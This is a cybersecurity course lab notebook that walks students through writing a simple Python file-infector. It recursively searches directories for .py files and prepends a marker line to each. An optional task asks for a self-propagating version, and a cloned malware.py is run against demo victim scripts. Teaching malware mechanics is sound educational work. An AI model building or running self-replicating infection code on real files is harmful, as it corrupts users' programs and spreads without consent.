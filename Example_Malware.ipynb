{
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/carlosfmorenog/MLCyberSec/blob/main/Example_Malware.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "5DEA1PLZ9l2s"
      },
      "source": [
        "# Malware in Python"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "jnjXZwnC9l2v"
      },
      "source": [
        "In this laboratory, we will learn how to create a very basic malware using Python. Moreover, you will reflect on how this malware can be propagated in the virtual machine environment."
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "n6o8Hm0S9l2x"
      },
      "source": [
        "## Basic Requirements"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "V5wdfk4f9l2z"
      },
      "source": [
        "For this activity, you are required to install the `os` python module (using `pip install os`) in case you don't already have it. Also, you need the following files:\n",
        "* `victim1.py`: This script simply prints \"Hello world!\". If you are working locally in your computer, save it in the same directory that you are using for this notebook. Otherwise, we will load it directly from GitHub.\n",
        "* `victim2.py`: This code cracks a hashed password using a brute force approach (as seen in [Example_Passwords.ipynb](https://colab.research.google.com/drive/1sLa1N09ul_RFLt0_ypAPUPZjMc_zNiR-#scrollTo=cZkF6bskp51f)). If you are working locally in your computer, save it in a subdirectory from the path where this notebook is saved (you can use any name for the subdirectory). Otherwise, we will load it directly in a subdirectory called `Data` via GitHub"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "Run the following cell to load the two `.py` files from my GitHub website"
      ],
      "metadata": {
        "id": "mTlDe17MkdRU"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "!git clone https://github.com/carlosfmorenog/MLCyberSecMalware"
      ],
      "metadata": {
        "id": "1-HWnGxBkoPZ",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "b7dca680-6493-454a-9d16-ad3d46264969"
      },
      "execution_count": 1,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Cloning into 'MLCyberSecMalware'...\n",
            "remote: Enumerating objects: 12, done.\u001b[K\n",
            "remote: Counting objects: 100% (12/12), done.\u001b[K\n",
            "remote: Compressing objects: 100% (8/8), done.\u001b[K\n",
            "remote: Total 12 (delta 2), reused 8 (delta 1), pack-reused 0\u001b[K\n",
            "Receiving objects: 100% (12/12), done.\n",
            "Resolving deltas: 100% (2/2), done.\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "l1CnWRKR9l2z"
      },
      "source": [
        "## Implementing Malware in Python from Scratch"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "m-mQSB0E9l20"
      },
      "source": [
        "As you know, one of the main characteristics of a malware is to insert inself into a system (usually in a secert way) with the intent of compromising a program or the whole system. In this laboratory activity, we will design a simple code in Python which will replicate itself into other `.py` files."
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "UhpREn3Y9l22"
      },
      "source": [
        "### Search for .py files"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "k6VaPD3j9l23"
      },
      "source": [
        "**STEP 1**: We will implement a function called `search` which will be in charge of exploring a directory and its subdirectories to find all `.py` files. To do so, first you need to extract the list of files and subdirectories that are located in the current directory. To do so, you can use the command `filelist = os.listdir(path)`, where `path` is the current directory.\n",
        "\n",
        "**HINT**: If you got the data from GitHub, you can use the command `os.path.abspath(\"MLCyberSecMalware\")`. Otherwise, you should use `os.path.abspath(\"\")`"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 2,
      "metadata": {
        "id": "J4kXUtg89l23",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "ca6a8864-ce9e-4642-9caf-e9a3ce128b5b"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "['Data', 'victim1.py', '.git']"
            ]
          },
          "metadata": {},
          "execution_count": 2
        }
      ],
      "source": [
        "## Use this cell to\n",
        "## 1) import the os module,\n",
        "## 2) find the list of files/directories in the current directory and save them in a variable \"filelist\" and,\n",
        "## 3) print filelist.\n",
        "import os\n",
        "filelist = os.listdir(os.path.abspath(\"MLCyberSecMalware\"))\n",
        "filelist"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "cupAdHhT9l24"
      },
      "source": [
        "If you did the instructions correctly, you should see a list of the files and folders in your current path, including `.config`, `sample_data` and `MLCyberSecMalware`, which contains `victim1.py` and the `Data` folder where `victim2.py` is saved. Moreover if you are working in your computer, you will see this notebook and a folder called `.ipynb_checkpoints`."
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "korIrdk39l24"
      },
      "source": [
        "**STEP 2**: Using a `for` loop, iterate `filelist` to see which files have the `.py` extension.\n",
        "\n",
        "**HINT**: When you iterate $filelist$ you are examining strings, therefore you can take advantage of the string data structure and check if the last 3 positins of any given string are the characters $.py$. Once you have found a string that ends in $.py$, remember to **add** the path of the current directory to the name of the file separated by the \"/\" character or the \"_\\_\\\" characters before appending to the list."
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 3,
      "metadata": {
        "id": "Ou9vi94A9l25",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "b20cac3c-62e6-48a7-ab5a-d0779af82a3a"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "['/content/victim1.py']"
            ]
          },
          "metadata": {},
          "execution_count": 3
        }
      ],
      "source": [
        "## Use this cell to iterate filelist and find the .py files. If one is found, append it to a \"filestoinfect\" list.\n",
        "## In the end, print \"filestoinfect\".\n",
        "filestoinfect = []\n",
        "for name in filelist:\n",
        "    if name[-3:] == \".py\":\n",
        "        filestoinfect.append(os.path.abspath(\"\")+\"/\"+name)\n",
        "filestoinfect"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "kdXhKjfJ9l26"
      },
      "source": [
        "If done have done this correctly, you should be able to append the malware and `victim1.py` but **NOT** `victim2.py`. This is due to the fact that we have only explored the current directory, but not its subdirectories!"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "nW5-t23B9l26"
      },
      "source": [
        "**STEP 3**: Using a for loop, iterate once again `filelist` to **print** the names of the subdirectories.\n",
        "\n",
        "**HINT**: You can use the command `os.path.isdir(\"MLCyberSecMalware/\"+name)` to know if a certain name is in the filelist is a directory or not."
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 4,
      "metadata": {
        "id": "QeWZThxb9l27",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "f29bb6e1-1d35-4e22-a3e8-9c8119105316"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "MLCyberSecMalware/Data\n",
            "MLCyberSecMalware/.git\n"
          ]
        }
      ],
      "source": [
        "## Use this cell to iterate filelist and print the subdirectories.\n",
        "for name in filelist:\n",
        "  if os.path.isdir(\"MLCyberSecMalware/\"+name):\n",
        "        print(\"MLCyberSecMalware/\"+name)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Hy3uajss9l27"
      },
      "source": [
        "If you have done this step correctly, then you will print the subdirectories of your current path, including `Data`, the one where `victim2.py` is stored. If you are doing this excercise online, a folder called `.git` will appear, and if you are working locally in your computer, you will see a folder called `.ipynb_checkpoints`, which is autogenerated by Jupyter Notebook as an autosave."
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Khgb_7R_9l28"
      },
      "source": [
        "**STEP 4**: Now that we have all of these elements, create a `search()` function which will take a `path` as an input and will return the list of files to infect."
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 5,
      "metadata": {
        "id": "UTdVdqys9l28",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "134b275a-2497-4cf6-f523-be5f774fef1a"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "List of files to infect:\n",
            "\n",
            "['/content/MLCyberSecMalware/Data/victim2.py', '/content/MLCyberSecMalware/victim1.py']\n"
          ]
        }
      ],
      "source": [
        "## Use this cell to implement the search function.\n",
        "import os\n",
        "def search(path):\n",
        "    # 1. Define \"filestoinfect\" as an empty list.\n",
        "    filestoinfect = []\n",
        "    # 2. Find the list of files/irectories in the specified path and save them in variable \"filelist\".\n",
        "    filelist = os.listdir(path)\n",
        "    # 3. for name in filelist:\n",
        "    for name in filelist:\n",
        "        # 3.a. Check if name is a subdirectory. If true, call again the search function in this subdirectory.\n",
        "        # HINT: To avoid reset filestoinfect when you call the function, use filestoinfect.extend(search(path+\"/\"+name))\n",
        "        if os.path.isdir(\"MLCyberSecMalware/\"+name):\n",
        "            filestoinfect.extend(search(path+\"/\"+name))\n",
        "        # 3.b. Else, if it is a .py file, append it to \"filestoinfect\"\n",
        "        elif name[-3:] == \".py\":\n",
        "            filestoinfect.append(path+\"/\"+name)\n",
        "    return filestoinfect\n",
        "\n",
        "## Use the search function in the current directory\n",
        "filestoinfect = search(os.path.abspath(\"MLCyberSecMalware\"))\n",
        "print(\"List of files to infect:\\n\")\n",
        "print(filestoinfect)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "7eVxWJ-p9l29"
      },
      "source": [
        "If the function was implemented correctly, then you will be able to print the malware and the two victim files."
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "3XWskUbS9l29"
      },
      "source": [
        "### Infect .py files"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "collapsed": true,
        "id": "-Pfy30cz9l29"
      },
      "source": [
        "To infect the files, you have to loop the `filestoinfect`  list and get each of the files infected. The infection consists in two steps:\n",
        "1. Loading the file to be infected and storing the instructions of the `.py` file into a *temp* variable.\n",
        "2. Adding the malware to the temp and rewritting the loaded file."
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 7,
      "metadata": {
        "collapsed": true,
        "id": "ComZo1Ee9l29"
      },
      "outputs": [],
      "source": [
        "def infect(filestoinfect):\n",
        "    malware = '# This file is infected by malware!\\n'\n",
        "    for name in filestoinfect:\n",
        "        # 1. Open the file, load the instructions in a temp variable and close the file.\n",
        "        f = open(name)\n",
        "        temp = f.read()\n",
        "        f.close()\n",
        "        # 2. Open the the file in \"write mode\" and write the malware and close the file.\n",
        "        f = open(name,'w')\n",
        "        f.write(malware+temp)\n",
        "        f.close()\n",
        "    return\n",
        "\n",
        "infect(filestoinfect)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "aDt1D6xE9l2-"
      },
      "source": [
        "Now, inspect the victim files and see if the first line of the file has the malware.\n",
        "The first line of the code should be: `a=\"This file is infected by malware!\"`"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Z_eoorC_9l2-"
      },
      "source": [
        "**OPTIONAL TASK**: Create a Python file called `malware.py` and paste the `search()` and the `infect()` functions. Apply the following changes to the functions:\n",
        "* `search()`: Implement a mechanism that **EXCLUDES** `malware.py` from the `filestoinfect` list the file that is running the malware (**HINT**: Use a marker).\n",
        "* `infect()`: Infect the victim files using **the code contained in `malware.py`** instead, so that when an unsuspected user runs a victim code, the malware keeps propagating!\n",
        "* General: Print a message (for instance, \"THE MALWARE IS OUT! $N$ FILES HAVE BEEN INFECTED!\") where $N$ is the number of files that have been infected by the malware. (**HINT** use a counter inside the `infect()` function).\n",
        "\n",
        "**NOTE**: Make sure that the very last line of `malware.py` is empty, so that when the code is copied into the victims, it doesn't overlap the first instruction of the victim."
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!git clone https://github.com/carlosfmorenog/MLCyberSecMalware2"
      ],
      "metadata": {
        "id": "Pd3boGeVCOFE",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "80ad0cac-5141-417a-87fd-cba601af460b"
      },
      "execution_count": 8,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Cloning into 'MLCyberSecMalware2'...\n",
            "remote: Enumerating objects: 35, done.\u001b[K\n",
            "remote: Counting objects:   2% (1/35)\u001b[K\rremote: Counting objects:   5% (2/35)\u001b[K\rremote: Counting objects:   8% (3/35)\u001b[K\rremote: Counting objects:  11% (4/35)\u001b[K\rremote: Counting objects:  14% (5/35)\u001b[K\rremote: Counting objects:  17% (6/35)\u001b[K\rremote: Counting objects:  20% (7/35)\u001b[K\rremote: Counting objects:  22% (8/35)\u001b[K\rremote: Counting objects:  25% (9/35)\u001b[K\rremote: Counting objects:  28% (10/35)\u001b[K\rremote: Counting objects:  31% (11/35)\u001b[K\rremote: Counting objects:  34% (12/35)\u001b[K\rremote: Counting objects:  37% (13/35)\u001b[K\rremote: Counting objects:  40% (14/35)\u001b[K\rremote: Counting objects:  42% (15/35)\u001b[K\rremote: Counting objects:  45% (16/35)\u001b[K\rremote: Counting objects:  48% (17/35)\u001b[K\rremote: Counting objects:  51% (18/35)\u001b[K\rremote: Counting objects:  54% (19/35)\u001b[K\rremote: Counting objects:  57% (20/35)\u001b[K\rremote: Counting objects:  60% (21/35)\u001b[K\rremote: Counting objects:  62% (22/35)\u001b[K\rremote: Counting objects:  65% (23/35)\u001b[K\rremote: Counting objects:  68% (24/35)\u001b[K\rremote: Counting objects:  71% (25/35)\u001b[K\rremote: Counting objects:  74% (26/35)\u001b[K\rremote: Counting objects:  77% (27/35)\u001b[K\rremote: Counting objects:  80% (28/35)\u001b[K\rremote: Counting objects:  82% (29/35)\u001b[K\rremote: Counting objects:  85% (30/35)\u001b[K\rremote: Counting objects:  88% (31/35)\u001b[K\rremote: Counting objects:  91% (32/35)\u001b[K\rremote: Counting objects:  94% (33/35)\u001b[K\rremote: Counting objects:  97% (34/35)\u001b[K\rremote: Counting objects: 100% (35/35)\u001b[K\rremote: Counting objects: 100% (35/35), done.\u001b[K\n",
            "remote: Compressing objects:   3% (1/28)\u001b[K\rremote: Compressing objects:   7% (2/28)\u001b[K\rremote: Compressing objects:  10% (3/28)\u001b[K\rremote: Compressing objects:  14% (4/28)\u001b[K\rremote: Compressing objects:  17% (5/28)\u001b[K\rremote: Compressing objects:  21% (6/28)\u001b[K\rremote: Compressing objects:  25% (7/28)\u001b[K\rremote: Compressing objects:  28% (8/28)\u001b[K\rremote: Compressing objects:  32% (9/28)\u001b[K\rremote: Compressing objects:  35% (10/28)\u001b[K\rremote: Compressing objects:  39% (11/28)\u001b[K\rremote: Compressing objects:  42% (12/28)\u001b[K\rremote: Compressing objects:  46% (13/28)\u001b[K\rremote: Compressing objects:  50% (14/28)\u001b[K\rremote: Compressing objects:  53% (15/28)\u001b[K\rremote: Compressing objects:  57% (16/28)\u001b[K\rremote: Compressing objects:  60% (17/28)\u001b[K\rremote: Compressing objects:  64% (18/28)\u001b[K\rremote: Compressing objects:  67% (19/28)\u001b[K\rremote: Compressing objects:  71% (20/28)\u001b[K\rremote: Compressing objects:  75% (21/28)\u001b[K\rremote: Compressing objects:  78% (22/28)\u001b[K\rremote: Compressing objects:  82% (23/28)\u001b[K\rremote: Compressing objects:  85% (24/28)\u001b[K\rremote: Compressing objects:  89% (25/28)\u001b[K\rremote: Compressing objects:  92% (26/28)\u001b[K\rremote: Compressing objects:  96% (27/28)\u001b[K\rremote: Compressing objects: 100% (28/28)\u001b[K\rremote: Compressing objects: 100% (28/28), done.\u001b[K\n",
            "remote: Total 35 (delta 11), reused 22 (delta 4), pack-reused 0\u001b[K\n",
            "Receiving objects: 100% (35/35), 6.14 KiB | 6.14 MiB/s, done.\n",
            "Resolving deltas: 100% (11/11), done.\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#Now, let's run the malware!\n",
        "!python /content/MLCyberSecMalware2/malware.py"
      ],
      "metadata": {
        "id": "KbF-F8p3DXpt",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "046c38fb-4cbf-4aaf-c283-fd6fd04edc1f"
      },
      "execution_count": 9,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "List of files to infect:\n",
            "\n",
            "['/content/MLCyberSecMalware2/Data/victim2.py', '/content/MLCyberSecMalware2/victim1.py']\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "You can see both files are infected by the malware in the notebook, not in GitHub!"
      ],
      "metadata": {
        "id": "5zwmQwi3D44h"
      }
    }
  ],
  "metadata": {
    "kernelspec": {
      "display_name": "Python 3",
      "language": "python",
      "name": "python3"
    },
    "language_info": {
      "codemirror_mode": {
        "name": "ipython",
        "version": 3
      },
      "file_extension": ".py",
      "mimetype": "text/x-python",
      "name": "python",
      "nbconvert_exporter": "python",
      "pygments_lexer": "ipython3",
      "version": "3.6.0"
    },
    "colab": {
      "provenance": [],
      "include_colab_link": true
    }
  },
  "nbformat": 4,
  "nbformat_minor": 0
}